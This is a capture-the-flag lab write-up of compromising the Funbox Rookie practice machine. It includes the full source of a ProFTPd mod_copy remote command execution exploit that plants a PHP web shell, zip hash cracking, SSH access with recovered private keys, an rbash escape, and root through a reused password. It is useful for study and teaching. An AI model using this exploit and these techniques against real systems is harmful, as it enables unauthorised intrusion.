Target is: 192.168.199.107

nmap --top-ports 100 -sV 192.168.199.107 -sC                                                    

Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-13 04:19 EDT

Nmap scan report for 192.168.199.107

Host is up (0.046s latency).

Not shown: 97 closed tcp ports (conn-refused)

PORT   STATE SERVICE VERSION

21/tcp open  ftp     ProFTPD 1.3.5e

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip

| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip

| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip

| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip

| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip

| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip

| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip

| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip

| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip

| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip

| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg

|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   2048 f9467dfe0c4da97e2d77740fa2517251 (RSA)

|   256 15004667809b40123a0c6607db1d1847 (ECDSA)

|_  256 75ba6695bb0f16de7e7ea17b273bb058 (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

|_http-title: Apache2 Ubuntu Default Page: It works

| http-robots.txt: 1 disallowed entry 

|_/logs/

|_http-server-header: Apache/2.4.29 (Ubuntu)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 9.27 seconds

  

Check out the FTP files and also the disallowed entry. Will try PentestGPT's suggestions as well. (**Configures PentestGPT locally really quick**)

PentestGPT consultation

python3 main.py --reasoning_model=gpt-4 --useAPI

target is 192.168.199.107. Goal is to get root access. No auto exploit frameworks

What next? Also don't suggest auto exploit frameworks.

And it broke lol

Anyhow looking first at FTP anon I'll check out what's there

  

Dumped the FTP contents and the welcome message says it's an experimental FTP server.

Attempt to unzip files asks for an id_rsa password

Will go back to this for cracking...

Checking for a service version vuln

Found exploit for the ProFTPd version

 →  searchsploit ProFTPD 1.3.5

---------------------------------------------------------------------------------- ---------------------------------

 Exploit Title                                                                    |  Path

---------------------------------------------------------------------------------- ---------------------------------

ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                         | linux/remote/37262.rb

ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                               | linux/remote/36803.py

ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                           | linux/remote/49908.py

ProFTPd 1.3.5 - File Copy                                                         | linux/remote/36742.txt

---------------------------------------------------------------------------------- ---------------------------------

Shellcodes: No Results

Papers: No Results

cat /usr/share/exploitdb/exploits/linux/remote/36803.py

  

# Title: ProFTPd 1.3.5 Remote Command Execution

# Date : 20/04/2015

# Author: R-73eN

# Software: ProFTPd 1.3.5 with mod_copy

# Tested : Kali Linux 1.06

# CVE : 2015-3306

# Greetz to Vadim Melihow for all the hard work .

import socket

import sys

import requests

#Banner

banner = ""

banner += "  ___        __        ____                 _    _  \n"

banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"

banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"

banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"

banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"

print banner

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if(len(sys.argv) < 4):

    print '\n Usage : exploit.py server directory cmd'

else:

        server = sys.argv[1] #Vulnerable Server

        directory = sys.argv[2] # Path accessible from web .....

        cmd = sys.argv[3] #PHP payload to be executed

        evil = '<?php system("' + cmd + '") ?>'

        s.connect((server, 21))

        s.recv(1024)

        print '[ + ] Connected to server [ + ] \n'

        s.send('site cpfr /etc/passwd')

        s.recv(1024)

        s.send('site cpto ' + evil)

        s.recv(1024)

        s.send('site cpfr /proc/self/fd/3')

        s.recv(1024)

        s.send('site cpto ' + directory + 'infogen.php')

        s.recv(1024)

        s.close()

        print '[ + ] Payload sended [ + ]\n'

        print '[ + ] Executing Payload [ + ]\n'

        r = requests.get('http://' + server + '/infogen.php') #Executing PHP payload through HTTP

        if (r.status_code == 200):

                print '[ * ] Payload Executed Succesfully [ * ]'

        else:

                print ' [ - ] Error : ' + str(r.status_code) + ' [ - ]'

  

print '\n [http://infogen.al/'⏎](http://infogen.al/%27%E2%8F%8E)

running python2 192.168.199.107 . whoami connects but nothing happens. (Also very annoying that the python version doesn't auto switch between 2 and three since some exploits were written in 2 while others 3 but one can only tell by looking at the code itself. 

Trying the other one then back to cracking (In hindsight it's better to set up cracking first before other activities)

Testing 2nd exploit 

python3 /usr/share/exploitdb/exploits/linux/remote/49908.py 192.168.199.107

python3 /usr/share/exploitdb/exploits/linux/remote/49908.py 192.168.199.107 anonymous                  07:49:29

220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.199.107]

  

530 Please login with USER and PASS

  

503-Bad sequence of commands

503 Bad sequence of commands

  

530 Please login with USER and PASS

  

503-Bad sequence of commands

503 Bad sequence of commands

  

Exploit Completed

[!] Something Went Wrong

[!] Directory might not be writable

AI Gen script on iterating through all zip files to get their hashes then dump them to a file

  

#!/bin/bash

  

# Create an empty hashes.txt file

> hashes.txt

  

# Iterate through all zip files in the current directory

for file in *.zip; do

  echo "Processing $file..."

  # Run zip2john to extract the hashes and append them to hashes.txt

  zip2john "$file" | tee -a hashes.txt

done

  

echo "Hashes dumped to hashes.txt."

chmod + x zip_hasher.sh

./ zip_hasher.sh

boom hashes dumped to hashes.txt (Now to test if john likes it.)

A simple john hashes.txt dumps catherine and tom's passwords

Tom: iubire

Catherine: catwoman

Got these creds so now time to use them to get into the system. Will unzip the files now.

Got two private keys. One for Tom and one for Catherine

Got Tom first so will use his to get in.

Making the key usable via ssh

chmod 600 id_rsa

Now to connect 

ssh -i id_rsa tom@192.168.199.107 (-i for ID or Insert key)

And I'm inside Tom's system

⚙  kali  🏡  OSCP  Funbox_Rookie_Linux                                                                         

 →  ssh -i id_rsa tom@192.168.199.107                                                                      08:07:07

The authenticity of host '192.168.199.107 (192.168.199.107)' can't be established.

ED25519 key fingerprint is SHA256:ZBER3N78DusT56jsi/IGcAxcCB2W5CZWUJTbc3K4bZc.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '192.168.199.107' (ED25519) to the list of known hosts.

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-117-generic x86_64)

  

 * Documentation:  https://help.ubuntu.com

 * Management:     https://landscape.canonical.com

 * Support:        https://ubuntu.com/advantage

  

  System information as of Sat May 13 12:10:17 UTC 2023

  

  System load:  0.0               Processes:             161

  Usage of /:   74.5% of 4.37GB   Users logged in:       0

  Memory usage: 35%               IP address for ens256: 192.168.199.107

  Swap usage:   0%

  

  

30 packages can be updated.

0 updates are security updates.

  

  

  

The programs included with the Ubuntu system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.

  

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by

applicable law.

  

To run a command as administrator (user "root"), use "sudo <command>".

See "man sudo_root" for details.

  

tom@funbox2:~$ whoami

tom

tom@funbox2:~$ 

Check for local user flag

tom@funbox2:~$ ls

local.txt

tom@funbox2:~$ cat local.txt

e2d31843f09a5afaf98419f4c987543e

Now onto priv esc

tom@funbox2:~$ cd /

-rbash: cd: restricted

time to upgrade bash from rbash to a better one. I'll check for python and upgrade from to normal bash

python default no but python3 yes

tom@funbox2:~$ ls

local.txt

tom@funbox2:~$ python3

Python 3.6.9 (default, Jul 17 2020, 12:50:27) 

[GCC 8.4.0] on linux

Type "help", "copyright", "credits" or "license" for more information.

>>> 

Python3 upgrade to bash

python3 -c 'import os; os.system("/bin/bash");'

now check for movement

NOPE. Python 3 is a sudo command

I'll try to reconnect via SSH and run a command on startup

ssh -i id_rsa tom@192.168.199.107 -t bash

Works

tom@funbox2:~$ ls

local.txt

tom@funbox2:~$ cd /

tom@funbox2:/$ ls

bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old

boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz

tom@funbox2:/$ cd root/

bash: cd: root/: Permission denied

tom@funbox2:/$ 

Check out all the files in home

tom@funbox2:~$ ls -alt

total 48

-rw------- 1 tom  tom   239 May 13 12:20 .bash_history

drwxr-xr-x 5 tom  tom  4096 May 13 12:16 .

-rw------- 1 tom  tom    57 May 13 12:16 .python_history

drwx------ 2 tom  tom  4096 May 13 12:10 .cache

-rw-r--r-- 1 tom  tom    33 May 13 08:17 local.txt

-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history

drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh

drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg

drwxr-xr-x 3 root root 4096 Jul 25  2020 ..

-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout

-rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc

-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile

tom@funbox2:~$ cat .mysql_history 

_HiStOrY_V2_

show\040databases;

quit

create\040database\040'support';

create\040database\040support;

use\040support

create\040table\040users;

show\040tables

;

select\040*\040from\040support

;

show\040tables;

select\040*\040from\040support;

insert\040into\040support\040(tom,\040xx11yy22!);

quit

Maybe a password left there

Now to check around for programs that allow root level execution to priv esc from there.

tom@funbox2:~$ find / -perm -4000 2>/dev/null

/snap/core/10126/bin/mount

/snap/core/10126/bin/ping

/snap/core/10126/bin/ping6

/snap/core/10126/bin/su

/snap/core/10126/bin/umount

/snap/core/10126/usr/bin/chfn

/snap/core/10126/usr/bin/chsh

/snap/core/10126/usr/bin/gpasswd

/snap/core/10126/usr/bin/newgrp

/snap/core/10126/usr/bin/passwd

/snap/core/10126/usr/bin/sudo

/snap/core/10126/usr/lib/dbus-1.0/dbus-daemon-launch-helper

/snap/core/10126/usr/lib/openssh/ssh-keysign

/snap/core/10126/usr/lib/snapd/snap-confine

/snap/core/10126/usr/sbin/pppd

/snap/core/9993/bin/mount

/snap/core/9993/bin/ping

/snap/core/9993/bin/ping6

/snap/core/9993/bin/su

/snap/core/9993/bin/umount

/snap/core/9993/usr/bin/chfn

/snap/core/9993/usr/bin/chsh

/snap/core/9993/usr/bin/gpasswd

/snap/core/9993/usr/bin/newgrp

/snap/core/9993/usr/bin/passwd

/snap/core/9993/usr/bin/sudo

/snap/core/9993/usr/lib/dbus-1.0/dbus-daemon-launch-helper

/snap/core/9993/usr/lib/openssh/ssh-keysign

/snap/core/9993/usr/lib/snapd/snap-confine

/snap/core/9993/usr/sbin/pppd

/bin/su

/bin/umount

/bin/mount

/bin/fusermount

/bin/ping

/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

/usr/lib/eject/dmcrypt-get-device

/usr/lib/dbus-1.0/dbus-daemon-launch-helper

/usr/lib/openssh/ssh-keysign

/usr/lib/policykit-1/polkit-agent-helper-1

/usr/lib/snapd/snap-confine

/usr/bin/chsh

/usr/bin/newuidmap

/usr/bin/passwd

/usr/bin/sudo

/usr/bin/chfn

/usr/bin/newgrp

/usr/bin/gpasswd

/usr/bin/traceroute6.iputils

/usr/bin/pkexec

/usr/bin/newgidmap

/usr/bin/at

tom@funbox2:~$ 

 This rabbithole looks like at can be use for command escalation

tom@funbox2:~$ man at

tom@funbox2:~$ at ls /root 

syntax error. Last token seen: l

Garbled time

tom@funbox2:~$ 

Something is wrong with the time

Will try the password from earlier xx11yy22!

tom@funbox2:~$ sudo -l

[sudo] password for tom: 

Matching Defaults entries for tom on funbox2:

    env_reset, mail_badpass,

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  

User tom may run the following commands on funbox2:

    (ALL : ALL) ALL

Ok so go for sudo su (switch user)

tom@funbox2:~$ whoami

tom

tom@funbox2:~$ sudo su

root@funbox2:/home/tom# cd

root@funbox2:~# ls

flag.txt  proof.txt

root@funbox2:~# cat *

Your flag is in another file...

87d95cc8991671471b2f4ff3d93c37b2

root@funbox2:~# whoami

root

root@funbox2:~# 

And Boot2Root